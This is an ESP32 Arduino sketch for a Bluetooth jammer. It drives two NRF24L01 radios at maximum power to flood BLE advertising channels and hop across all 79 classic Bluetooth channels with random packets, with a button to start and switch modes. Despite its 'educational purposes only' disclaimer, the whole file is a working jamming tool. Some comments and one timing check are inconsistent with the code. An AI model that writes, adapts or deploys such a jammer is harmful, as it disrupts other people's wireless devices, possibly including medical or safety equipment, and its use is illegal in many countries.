/*
  Code for my Bluetooth Jammer built with an ESP32 with 2x NRF24L01 modules.

  More info: https://github.com/stuthemoo/ESP32BluetoothJammer

  FOR EDUCATIONAL PURPOSES ONLY!
  This code repository is for educational purposes only! DO NOT use a signal jamming device as they can can interfere with public safety communications and emergency services. In many countries the use of signal jammers is prohibited by law and intentional interference with wireless signals can result in severe penalties.
*/

#include <SPI.h>
#include <RF24.h>

#define BUTTON_PIN 0 // Built in BOOT button
#define LED_PIN 2 // Built in LED

// 16 Mhz SPI speed
constexpr int SPI_SPEED = 16000000;

// First NRF24L01 on CE 27, CSN 32
RF24 radio1(22, 21, SPI_SPEED);

// Second NRF24L01 on CE 4, CSN 2
RF24 radio2(16, 15, SPI_SPEED);

// BLE Advertising channels (2402MHz, 2426MHz, 2480MHz) - NRF24L01 uses different channel numbering
int ble_channels[] = { 2, 26, 80 };

// Bluetooth classic channels (2402–2480 MHz) - NRF24L01 channels are the same plus 2 MHz
int bluetooth_channels[79];
// Channels added in setup()

// Each radio transmits on one half of the channel range
uint8_t num_channels = sizeof(ble_channels) / sizeof(ble_channels[0]);
uint8_t split_index = num_channels / 2;
uint8_t endCh1 = split_index - 1;
uint8_t startCh2 = split_index;
uint8_t endCh2 = num_channels - 1;

// Start in BLE mode and press the button again to switch to classic channels
bool classicMode = false;
bool jammingOn = false;
unsigned long lastHopTime = 0;
const unsigned long hopInterval = 300;  // microseconds

bool buttonState = HIGH;
bool lastButtonState = HIGH;

void setup() {
  // Give ESP32 extra time to start up
  delay(2000);

  // Bluetooth classic channels (2402–2480 MHz) - NRF24L01 channels are the same plus 2 MHz
  for (int i = 0; i < 79; i++) {  
    bluetooth_channels[i] = i + 2; // 2402 MHz + (i MHz)
  }

  // Start serial monitor for debugging
  Serial.begin(115200);
  Serial.println("\n--- FOR EDUCATIONAL PURPOSES ONLY! ---\nThis code repository is for educational purposes only!\nDO NOT use a signal jamming device as they can can interfere with public safety communications and emergency services.\nIn many countries the use of signal jammers is prohibited by law and intentional interference with wireless signals can result in severe penalties.\n");
  
  Serial.println("Bluetooth jammer is starting...");

  // Setup Button & LED
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT);
  // digitalWrite(LED_PIN, LOW);

  // Check radios have started ok
  while (!radio1.begin()) {
    Serial.println("Radio 1 init failed. Check wiring.");

    // Recheck radio every 5 seconds
    delay(5000);
    if(radio1.failureDetected) {
      radio1.begin();                          // Attempt to re-configure the radio with defaults
      radio1.failureDetected = 0;              // Reset the detection value
    }
  }
  while (!radio2.begin()) {
    Serial.println("Radio 2 init failed. Check wiring.");

    // Recheck radio every 5 seconds
    delay(5000);
    if(radio2.failureDetected) {
      radio2.begin();                          // Attempt to re-configure the radio with defaults
      radio2.failureDetected = 0;              // Reset the detection value
    }
  }

  // Configure radio modules settings
  setupRadio(radio1);
  setupRadio(radio2);

  // if(radio1.isPVariant()) { Serial.println("Radio 1 is PVariant"); }else{ Serial.println("Radio 1 is NOT PVariant"); }
  // if(radio2.isPVariant()) { Serial.println("Radio 2 is PVariant"); }else{ Serial.println("Radio 2 is NOT PVariant"); }

  delay(2000);
  
  Serial.println("Setup complete.\n\nPress BOOT to start jamming...\nPress it again to switch to BT classic mode...\n");
}

void setupRadio(RF24& radio) {
  // Radio settings
  radio.setAutoAck(false);                // Disable auto acknowledgement
  radio.setRetries(0, 0);                 // No retries
  radio.disableCRC();                     // Disable CRC validation
  radio.setDataRate(RF24_2MBPS);          // High rate to increase traffic
  radio.setPALevel(RF24_PA_MAX, 0);       // Max power
  radio.setChannel(ble_channels[0]);      // Start on first channel
  radio.setPayloadSize(32);               // Standard BLE packet size
  radio.stopListening();                  // Transmit mode
  radio.powerUp();

  radio.setAddressWidth(3); // Shorter address means faster channel switching
  radio.setAutoAck(0x00); // Fully disabled auto ack
}

void setClasicMode() {
  // Switch from BLE only to Bluetooth classic mode
  num_channels = sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]);
  split_index = num_channels / 2;
  endCh1 = split_index - 1;
  startCh2 = split_index;
  endCh2 = num_channels - 1;

  // Classic mode flag
  classicMode = true;
}

void loop() {
  static int hopCount = 0;

  // Get debugging info using serial monitor
  if (Serial.available() > 0) {
    String serialInput = Serial.readStringUntil('\n');
    serialInput.trim();

    // If 'debug1' or 'debug2' is typed then show debugging info for that radio
    if(serialInput == "debug1") {
      Serial.println("Radio 1 debugging info...");
      radio1.printPrettyDetails();
    }else if(serialInput == "debug2") {
      Serial.println("Radio 2 debugging info...");
      radio2.printPrettyDetails();
    }
  }
  
  // If the button is pressed then start/stop jamming
  buttonState = digitalRead(BUTTON_PIN);
  if(buttonState == LOW && lastButtonState == HIGH ) {
    if(jammingOn && classicMode) {
      // Stop jamming
      jammingOn = false;

      // Turn the LED off
      digitalWrite(LED_PIN, LOW);

      Serial.println("\nTransmission stopped.\n");

      // Reset device
      ESP.restart();
    }else if(jammingOn) {
      // Switch modes and continue
      setClasicMode();

      Serial.println("\nSwitched to bluetooth classic channels...\n");
    }else{
      // Start jamming
      jammingOn = true;

      // Turn the LED on
      digitalWrite(LED_PIN, HIGH);

      Serial.println("Start transmitting...");
    }
    delay(200); // Button debounce
  }
  lastButtonState = buttonState;

  // If the jammer has been started and its past the hop interval time
  if (jammingOn && (micros() - lastHopTime >= hopInterval)) {
    sendRandomPacket();
    
    hopCount++;
    lastHopTime = micros();

    // Debug output every 5 seconds
    if (millis() - (micros() * 1000) >= 5000 && hopCount) {
      Serial.print("Transmitted to");
      if(classicMode) {
        Serial.print(" classic");
      }else{
        Serial.print(" BLE");
      }
      Serial.print(" channels " + String(hopCount) + " times.");
      Serial.println();
    }
  }
}

void sendRandomPacket() {
  static uint8_t ch1 = 0;
  static uint8_t ch2 = startCh2;

  // Generate random payload
  uint8_t payload[32];
  for (uint8_t i = 0; i < 32; i++) payload[i] = random(256);

  if (classicMode) {
    // In classic mode each radio takes care of one half of the channels
    radio1.setChannel(bluetooth_channels[ch1]);
    radio2.setChannel(bluetooth_channels[ch2]);
    
    ch1 = (ch1 + 1);
    if(ch1 > endCh1) ch1 = 0;
    ch2 = (ch2 + 1);
    if(ch2 > endCh2) ch2 = startCh2;
  } else {
    // BLE advertising channels
    radio1.setChannel(ble_channels[ch1]);
    radio2.setChannel(ble_channels[ch2]);

    ch1 = (ch1 + 1);
    if(ch1 > endCh1) ch1 = 0;
    ch2 = (ch2 + 1);
    if(ch2 > endCh2) ch2 = startCh2;
  }

  // Transmit payload
  radio1.startFastWrite(payload, sizeof(payload), true);
  radio2.startFastWrite(payload, sizeof(payload), true);
}